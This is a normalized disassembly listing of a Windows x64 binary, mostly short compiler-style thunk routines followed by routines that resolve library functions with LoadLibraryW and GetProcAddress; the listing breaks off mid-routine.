jmp j_sub_140030690
sub_1400581f0
lea rcx [ rdx + 0x78 ]
jmp sub_140001ba0
sub_140058200
lea rcx [ rdx + 0x78 ]
jmp sub_140001ba0
sub_140058210
lea rcx [ rdx + 0x30 ]
jmp sub_140001ba0
sub_140058220
lea rcx [ rdx + 0x58 ]
jmp sub_140001ba0
sub_140058230
lea rcx [ rdx + 0xd8 ]
jmp sub_140001ba0
sub_140058240
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_140058250
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_140058260
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_140058270
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_140058280
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_140058290
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_1400582a0
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_1400582b0
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_1400582c0
lea rcx [ rdx + 0xb8 ]
jmp sub_140001ba0
sub_1400582d0
lea rcx [ rdx + 0x90 ]
jmp sub_140001ba0
sub_1400582e0
lea rcx [ rdx + 0x30 ]
jmp sub_1400067d0
sub_1400582f0
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058300
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058310
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058320
lea rcx [ rdx + 0x30 ]
jmp sub_1400037c0
sub_140058330
lea rcx [ rdx + 0x130 ]
jmp sub_140001ba0
sub_140058340
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058350
lea rcx [ rdx + 0x50 ]
jmp sub_1400067d0
sub_140058360
lea rcx [ rdx + 0x28 ]
jmp sub_140001ba0
sub_140058370
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_140058380
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_140058390
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_1400583a0
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_1400583b0
lea rcx [ rdx + 0x30 ]
jmp sub_140001ba0
sub_1400583c0
lea rcx [ rdx + 0x30 ]
jmp sub_140001ba0
sub_1400583d0
mov rcx [ rdx + 0x30 ]
jmp sub_140001ba0
sub_1400583e0
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_1400583f0
lea rcx [ rdx + 0x38 ]
jmp sub_140001ba0
sub_140058400
lea rcx [ rdx + 0x38 ]
jmp sub_140001ba0
sub_140058410
mov rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_140058420
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058430
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058440
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058450
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058460
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058470
mov rcx [ rdx + 0x58 ]
jmp sub_140001ba0
sub_140058480
lea rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_140058490
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_1400584a0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_1400584b0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_1400584c0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_1400584d0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_1400584e0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_1400584f0
lea rcx [ rdx + 0xb0 ]
jmp sub_140001ba0
sub_140058500
lea rcx [ rdx + 0x88 ]
jmp sub_140001ba0
sub_140058510
mov rcx [ rdx + 0x20 ]
jmp j_sub_14003ad04
sub_140058520
mov rcx [ rdx + 0x50 ]
jmp sub_140001ba0
sub_140058530
lea rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_140058540
lea rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_140058550
lea rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_140058560
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_140058570
lea rcx [ rdx + 0x140 ]
jmp sub_140001ba0
sub_1400585b0
lea rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_140003dd0
sub_1400585c0
mov rcx [ rdx + 0x28 ]
jmp sub_140003850
sub_1400585d0
lea rcx [ rdx + 0x40 ]
jmp sub_1400037c0
sub_1400585e0
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_1400585f0
lea rcx [ rdx + 0x130 ]
jmp sub_140001ba0
sub_140058600
lea rcx [ rdx + 0x60 ]
jmp sub_14000f330
sub_140058610
lea rcx [ rdx + 0x158 ]
jmp sub_140001ba0
sub_140058620
mov rcx [ rdx + 0x20 ]
jmp j_sub_14003ad04
sub_140058630
mov rcx [ rdx + 0x50 ]
jmp sub_140001ba0
sub_140058640
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058650
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058660
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058670
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_140058680
lea rcx [ rdx + 0x110 ]
jmp sub_140001ba0
sub_140058690
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_1400586a0
lea rcx [ rdx + 0x60 ]
jmp sub_1400067d0
sub_1400586b0
lea rcx [ rdx + 0x138 ]
jmp sub_140001ba0
sub_1400586c0
mov rcx [ rdx + 0x20 ]
jmp j_sub_14003ad04
sub_1400586d0
mov rcx [ rdx + 0x50 ]
jmp sub_140001ba0
sub_1400586e0
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_1400586f0
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_140058700
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_140058710
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_140058720
lea rcx [ rdx + 0x120 ]
jmp sub_140001ba0
sub_140058730
lea rcx [ rdx + 0xd0 ]
jmp sub_140001ba0
sub_140058740
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058750
lea rcx [ rdx + 0xf8 ]
jmp sub_140001ba0
sub_140058760
lea rcx [ rdx + 0xf8 ]
jmp sub_140001ba0
sub_140058770
lea rcx [ rdx + 0xf8 ]
jmp sub_140001ba0
sub_140058780
lea rcx [ rdx + 0xf8 ]
jmp sub_140001ba0
sub_140058790
lea rcx [ rdx + 0xf0 ]
jmp sub_140001ba0
sub_1400587a0
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_1400587b0
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_1400587c0
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_1400587d0
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_1400587e0
lea rcx [ rdx + 0xa0 ]
jmp sub_140001ba0
sub_1400587f0
lea rcx [ rdx + 0xf0 ]
jmp sub_140001ba0
sub_140058800
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_140058810
lea rcx [ rdx + 0x118 ]
jmp sub_140001ba0
sub_140058820
lea rcx [ rdx + 0x118 ]
jmp sub_140001ba0
sub_140058830
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058840
lea rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_140058850
lea rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_140058860
lea rcx [ rdx + 0x1a0 ]
jmp sub_140001ba0
sub_140058870
mov rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_140058880
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058890
mov rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_1400588a0
mov rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_1400588b0
mov rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_1400588c0
mov rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_1400588d0
lea rcx [ rdx + 0x78 ]
jmp sub_140001ba0
sub_1400588e0
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_1400588f0
lea rcx [ rdx + 0x40 ]
jmp sub_140007fb0
sub_140058900
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058910
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058920
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058930
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058940
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058950
mov rcx [ rdx + 0x1a8 ]
jmp sub_140001ba0
sub_140058960
mov rcx [ rdx + 0x1a0 ]
jmp sub_140001ba0
sub_1400589a0
lea rcx [ rdx + 0xa0 ]
add rcx 0x18
jmp sub_140003dd0
sub_1400589b0
mov rcx [ rdx + 0x260 ]
jmp sub_140003850
sub_1400589c0
lea rcx [ rdx + 0xa0 ]
jmp sub_1400037c0
sub_1400589d0
lea rcx [ rdx + 0x200 ]
jmp sub_14000f330
sub_1400589e0
lea rcx [ rdx + 0x1d8 ]
jmp sub_140001ba0
sub_1400589f0
mov rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058a00
lea rcx [ rdx + 0x1b0 ]
jmp sub_140001ba0
sub_140058a10
lea rcx [ rdx + 0x1b0 ]
jmp sub_140001ba0
sub_140058a20
lea rcx [ rdx + 0x1d8 ]
jmp sub_140001ba0
sub_140058a30
lea rcx [ rdx + 0x1b0 ]
jmp sub_140001ba0
sub_140058a40
lea rcx [ rdx + 0x1b0 ]
jmp sub_140001ba0
sub_140058a50
lea rcx [ rdx + 0x1b0 ]
jmp sub_140001ba0
sub_140058a60
lea rcx [ rdx + 0x1f0 ]
jmp sub_140001ba0
sub_140058a70
lea rcx [ rdx + 0xa0 ]
jmp sub_1400037c0
sub_140058a80
lea rcx [ rdx + 0x1a0 ]
jmp sub_140001ba0
sub_140058a90
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058aa0
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058ab0
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058ac0
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058ad0
mov rcx [ rdx + 0x90 ]
jmp sub_140001ba0
sub_140058b10
lea rcx [ rdx + 0xa0 ]
add rcx 0x18
jmp sub_140003dd0
sub_140058b20
mov rcx [ rdx + 0x218 ]
jmp sub_140003850
sub_140058b30
lea rcx [ rdx + 0xa0 ]
jmp sub_1400037c0
sub_140058b40
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058b50
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058b60
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058b70
lea rcx [ rdx + 0x80 ]
jmp sub_140001ba0
sub_140058b80
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058b90
mov rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058c00
lea rcx [ rdx + 0x58 ]
jmp sub_140001ba0
sub_140058c10
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058c20
lea rcx [ rdx + 0x28 ]
jmp sub_140001ba0
sub_140058c30
lea rcx [ rdx + 0x28 ]
jmp sub_140001ba0
sub_140058c70
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140058c80
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140058c90
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058ca0
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140058cb0
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058cc0
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140058cd0
lea rcx [ rdx + 0x2e8 ]
jmp sub_140001ba0
sub_140058ce0
lea rcx [ rdx + 0x2e0 ]
jmp sub_140015410
sub_140058cf0
lea rcx [ rdx + 0x228 ]
jmp sub_140001ba0
sub_140058d00
lea rcx [ rdx + 0x220 ]
jmp sub_140015410
sub_140058d10
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_140058d20
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_140058d30
lea rcx [ rdx + 0x288 ]
jmp sub_140001ba0
sub_140058d40
lea rcx [ rdx + 0x280 ]
jmp sub_140015410
sub_140058d50
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058d60
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_140058d70
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_140058d80
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_140058d90
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_140058da0
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_140058db0
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058dc0
lea rcx [ rdx + 0x60 ]
jmp sub_140015410
sub_140058dd0
lea rcx [ rdx + 0xe8 ]
jmp sub_140001ba0
sub_140058de0
lea rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_140058df0
lea rcx [ rdx + 0x110 ]
jmp sub_140001ba0
sub_140058e00
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x48 ]
mov rcx [ rbp + 0x50 ]
call sub_140001050
add rsp 0x20
pop rbp
retn
sub_140058e20
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x50 ]
mov rcx [ rbp + 0x48 ]
call sub_140001050
add rsp 0x20
pop rbp
retn
sub_140058e40
mov rcx [ rdx + 0x48 ]
add rcx 0x8
jmp sub_140001ba0
sub_140058e50
lea rcx [ rdx + 0x20 ]
jmp sub_140014e70
sub_140058e60
lea rcx [ rdx + 0x78 ]
jmp sub_140001ba0
sub_140058ea0
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058eb0
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140058ec0
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058ed0
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140058f10
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140058f20
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140058f30
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140058f40
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140058f50
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140058f60
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140058f70
lea rcx [ rdx + 0x228 ]
jmp sub_140001ba0
sub_140058f80
lea rcx [ rdx + 0x220 ]
jmp sub_140015410
sub_140058f90
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140058fa0
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_140058fb0
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_140058fc0
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_140059000
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059010
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059020
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059030
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059040
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059050
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059060
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140059070
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_140059080
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_140059090
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_1400590d0
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_1400590e0
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059120
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059130
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059140
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059150
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059160
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059170
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059180
lea rcx [ rdx + 0x288 ]
jmp sub_140001ba0
sub_140059190
lea rcx [ rdx + 0x280 ]
jmp sub_140015410
sub_1400591a0
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_1400591b0
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_1400591c0
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_1400591d0
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_1400591e0
lea rcx [ rdx + 0x228 ]
jmp sub_140001ba0
sub_1400591f0
lea rcx [ rdx + 0x220 ]
jmp sub_140015410
sub_140059230
lea rcx [ rdx + 0x408 ]
jmp sub_140001ba0
sub_140059240
lea rcx [ rdx + 0x400 ]
jmp sub_140015410
sub_140059250
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059260
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059270
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059280
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059290
lea rcx [ rdx + 0x348 ]
jmp sub_140001ba0
sub_1400592a0
lea rcx [ rdx + 0x340 ]
jmp sub_140015410
sub_1400592b0
lea rcx [ rdx + 0x288 ]
jmp sub_140001ba0
sub_1400592c0
lea rcx [ rdx + 0x280 ]
jmp sub_140015410
sub_1400592d0
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_1400592e0
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_1400592f0
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_140059300
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_140059310
lea rcx [ rdx + 0x3a8 ]
jmp sub_140001ba0
sub_140059320
lea rcx [ rdx + 0x3a0 ]
jmp sub_140015410
sub_140059330
lea rcx [ rdx + 0x228 ]
jmp sub_140001ba0
sub_140059340
lea rcx [ rdx + 0x220 ]
jmp sub_140015410
sub_140059350
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059360
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059370
lea rcx [ rdx + 0x2e8 ]
jmp sub_140001ba0
sub_140059380
lea rcx [ rdx + 0x2e0 ]
jmp sub_140015410
sub_140059390
mov rcx [ rdx + 0x68 ]
jmp sub_140005c50
sub_1400593a0
mov rcx [ rdx + 0x60 ]
jmp sub_140005c50
sub_1400593b0
mov rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_1400593c0
mov rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_1400593d0
mov rcx [ rdx + 0x60 ]
jmp sub_140001ba0
sub_1400593e0
mov rcx [ rdx + 0x70 ]
jmp sub_140001ba0
sub_1400593f0
lea rcx [ rdx + 0xd8 ]
jmp sub_140001ba0
sub_140059400
mov rcx [ rdx + 0xd0 ]
jmp sub_140005c50
sub_140059410
mov rcx [ rdx + 0xc0 ]
jmp sub_140005c50
sub_140059420
mov rcx [ rdx + 0xb8 ]
jmp sub_140001ba0
sub_140059430
mov rcx [ rdx + 0xc0 ]
jmp sub_140001ba0
sub_140059470
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059480
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059490
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_1400594a0
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_1400594b0
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_1400594c0
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_1400594d0
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_1400594e0
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_140059520
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059530
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059540
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059550
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059560
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059570
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059580
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_140059590
lea rcx [ rdx + 0x40 ]
jmp sub_140001ba0
sub_1400595a0
lea rcx [ rdx + 0xe0 ]
jmp sub_140001ba0
sub_1400595b0
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_1400595c0
lea rcx [ rdx + 0x68 ]
jmp sub_140001ba0
sub_1400595d0
lea rcx [ rdx + 0x20 ]
jmp j_sub_1400070d0
sub_1400595e0
lea rcx [ rdx + 0xb8 ]
jmp sub_140001ba0
sub_1400595f0
lea rcx [ rdx + 0x90 ]
jmp sub_140001ba0
sub_140059600
lea rcx [ rdx + 0x40 ]
jmp j_sub_1400070d0
sub_140059610
lea rcx [ rdx + 0x38 ]
jmp sub_14001adb0
sub_140059620
lea rcx [ rdx + 0x100 ]
jmp sub_14000f330
sub_140059630
lea rcx [ rdx + 0x1a8 ]
jmp sub_140001ba0
sub_140059640
lea rcx [ rdx + 0x1d0 ]
jmp sub_140001ba0
sub_140059650
lea rcx [ rdx + 0x80 ]
jmp sub_140007fb0
sub_140059660
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_140059670
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_140059680
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_140059690
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_1400596a0
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_1400596b0
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_1400596c0
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_1400596d0
lea rcx [ rdx + 0x130 ]
jmp sub_140001ba0
sub_1400596e0
lea rcx [ rdx + 0x30 ]
jmp sub_1400037c0
sub_1400596f0
lea rcx [ rdx + 0x30 ]
jmp sub_1400037c0
sub_140059730
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_140059740
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059750
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059760
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059770
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059780
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059790
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_1400597a0
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_1400597b0
lea rcx [ rdx + 0x40 ]
jmp sub_14001adb0
sub_1400597c0
lea rcx [ rdx + 0x90 ]
jmp sub_140001ba0
sub_1400597d0
lea rcx [ rdx + 0x28 ]
jmp sub_14001adb0
sub_140059810
lea rcx [ rdx + 0x108 ]
jmp sub_140001ba0
sub_140059820
lea rcx [ rdx + 0x100 ]
jmp sub_140015410
sub_140059830
lea rcx [ rdx + 0xa8 ]
jmp sub_140001ba0
sub_140059840
lea rcx [ rdx + 0xa0 ]
jmp sub_140015410
sub_140059850
lea rcx [ rdx + 0x48 ]
jmp sub_140001ba0
sub_140059860
lea rcx [ rdx + 0x40 ]
jmp sub_140015410
sub_140059870
lea rcx [ rdx + 0x1c8 ]
jmp sub_140001ba0
sub_140059880
lea rcx [ rdx + 0x1c0 ]
jmp sub_140015410
sub_140059890
lea rcx [ rdx + 0x168 ]
jmp sub_140001ba0
sub_1400598a0
lea rcx [ rdx + 0x160 ]
jmp sub_140015410
sub_1400598b0
lea rcx [ rdx + 0x110 ]
jmp sub_140001ba0
sub_1400598c0
lea rcx [ rdx + 0x138 ]
jmp sub_140001ba0
sub_1400598d0
lea rcx [ rdx + 0x110 ]
jmp sub_1400134b0
sub_1400598e0
lea rcx [ rdx + 0xa0 ]
jmp sub_140001ba0
sub_1400598f0
lea rcx [ rdx + 0xc8 ]
jmp sub_140001ba0
sub_140059900
lea rcx [ rdx + 0xa0 ]
jmp sub_1400134b0
sub_140059910
lea rcx [ rdx + 0x30 ]
jmp sub_140001ba0
sub_140059920
lea rcx [ rdx + 0x58 ]
jmp sub_140001ba0
sub_140059930
lea rcx [ rdx + 0x30 ]
jmp sub_1400134b0
sub_140059940
lea rcx [ rdx + 0x650 ]
jmp sub_140001ba0
sub_140059950
lea rcx [ rdx + 0x678 ]
jmp sub_140001ba0
sub_140059960
lea rcx [ rdx + 0x650 ]
jmp sub_1400134b0
sub_140059970
lea rcx [ rdx + 0x570 ]
jmp sub_140001ba0
sub_140059980
lea rcx [ rdx + 0x598 ]
jmp sub_140001ba0
sub_140059990
lea rcx [ rdx + 0x570 ]
jmp sub_1400134b0
sub_1400599a0
lea rcx [ rdx + 0x490 ]
jmp sub_140001ba0
sub_1400599b0
lea rcx [ rdx + 0x4b8 ]
jmp sub_140001ba0
sub_1400599c0
lea rcx [ rdx + 0x490 ]
jmp sub_1400134b0
sub_1400599d0
lea rcx [ rdx + 0x3b0 ]
jmp sub_140001ba0
sub_1400599e0
lea rcx [ rdx + 0x3d8 ]
jmp sub_140001ba0
sub_1400599f0
lea rcx [ rdx + 0x3b0 ]
jmp sub_1400134b0
sub_140059a00
lea rcx [ rdx + 0x2d0 ]
jmp sub_140001ba0
sub_140059a10
lea rcx [ rdx + 0x2f8 ]
jmp sub_140001ba0
sub_140059a20
lea rcx [ rdx + 0x2d0 ]
jmp sub_1400134b0
sub_140059a30
lea rcx [ rdx + 0x1f0 ]
jmp sub_140001ba0
sub_140059a40
lea rcx [ rdx + 0x218 ]
jmp sub_140001ba0
sub_140059a50
lea rcx [ rdx + 0x1f0 ]
jmp sub_1400134b0
sub_140059a60
lea rcx [ rdx + 0x420 ]
jmp sub_140001ba0
sub_140059a70
lea rcx [ rdx + 0x448 ]
jmp sub_140001ba0
sub_140059a80
lea rcx [ rdx + 0x420 ]
jmp sub_1400134b0
sub_140059a90
lea rcx [ rdx + 0x500 ]
jmp sub_140001ba0
sub_140059aa0
lea rcx [ rdx + 0x528 ]
jmp sub_140001ba0
sub_140059ab0
lea rcx [ rdx + 0x500 ]
jmp sub_1400134b0
sub_140059ac0
lea rcx [ rdx + 0x180 ]
jmp sub_140001ba0
sub_140059ad0
lea rcx [ rdx + 0x1a8 ]
jmp sub_140001ba0
sub_140059ae0
lea rcx [ rdx + 0x180 ]
jmp sub_1400134b0
sub_140059af0
lea rcx [ rdx + 0x5e0 ]
jmp sub_140001ba0
sub_140059b00
lea rcx [ rdx + 0x608 ]
jmp sub_140001ba0
sub_140059b10
lea rcx [ rdx + 0x5e0 ]
jmp sub_1400134b0
sub_140059b20
lea rcx [ rdx + 0x260 ]
jmp sub_140001ba0
sub_140059b30
lea rcx [ rdx + 0x288 ]
jmp sub_140001ba0
sub_140059b40
lea rcx [ rdx + 0x260 ]
jmp sub_1400134b0
sub_140059b50
lea rcx [ rdx + 0x340 ]
jmp sub_140001ba0
sub_140059b60
lea rcx [ rdx + 0x368 ]
jmp sub_140001ba0
sub_140059b70
lea rcx [ rdx + 0x340 ]
jmp sub_1400134b0
sub_140059b80
mov rcx [ rdx + 0x70 ]
add rcx 0x8
jmp sub_140014c70
sub_140059b90
lea rcx [ rdx + 0x80 ]
jmp sub_140002af0
sub_140059ba0
mov rcx [ rdx + 0x50 ]
jmp j_sub_14003ad04
sub_140059bb0
sub rsp 0x28
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059bd0
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059c00
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059c30
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059c60
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059c90
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059cc0
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059cf0
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
